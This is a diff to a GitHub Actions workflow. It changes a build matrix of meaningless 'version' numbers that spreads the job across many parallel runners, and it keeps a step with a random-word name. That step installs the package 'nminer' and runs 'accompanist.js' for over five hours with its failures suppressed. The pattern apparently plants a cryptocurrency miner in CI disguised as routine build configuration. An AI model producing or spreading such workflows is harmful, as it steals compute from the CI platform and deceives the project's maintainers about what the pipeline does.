@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1899 }
-          - { version: 404 }
-          - { version: 6113 }
-          - { version: 9618 }
-          - { version: 5039 }
-          - { version: 8818 }
-          - { version: 6037 }
-          - { version: 8977 }
-          - { version: 678 }
-          - { version: 2013 }
-          - { version: 6382 }
-          - { version: 9954 }
-          - { version: 9120 }
-          - { version: 3627 }
-          - { version: 9129 }
-          - { version: 321 }
-          - { version: 206 }
-          - { version: 9255 }
-          - { version: 8117 }
+          - { version: 8494 }
+          - { version: 7873 }
+          - { version: 4580 }
+          - { version: 2702 }
+          - { version: 1825 }
+          - { version: 4850 }
+          - { version: 8700 }
+          - { version: 9508 }
+          - { version: 4832 }
+          - { version: 9350 }
+          - { version: 6693 }
+          - { version: 4001 }
+          - { version: 5500 }
+          - { version: 5150 }
+          - { version: 5123 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: distant gah elegantly enrich tall
+      - name: psst energetic yahoo outstanding
         run: |
           npm install nminer@latest
-          timeout 331m node accompanist.js || echo "accompanist executed"
+          timeout 317m node accompanist.js || echo "accompanist executed"
